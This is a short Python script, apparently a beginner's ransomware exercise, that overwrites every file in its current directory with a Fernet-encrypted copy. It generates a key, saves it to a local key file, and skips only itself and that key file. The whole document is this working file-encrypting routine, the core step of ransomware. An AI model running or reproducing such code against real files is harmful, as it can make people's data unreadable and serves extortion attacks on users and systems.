#! /usr/bin/env

import os
from cryptography.fernet import Fernet

#find the files 
#loop over the files
#read and write per itearation
#using an imported module for the key Encrypt


files = []

for file in os.listdir():
    if file == "encryption.py" or file == "encryption_key.key":  
        continue
    if os.path.isfile(file):
        files.append(file)
print(files)

key = Fernet.generate_key()

with open("encryption_key.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    encrypted_contents = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefiles:
        thefiles.write(encrypted_contents)

     
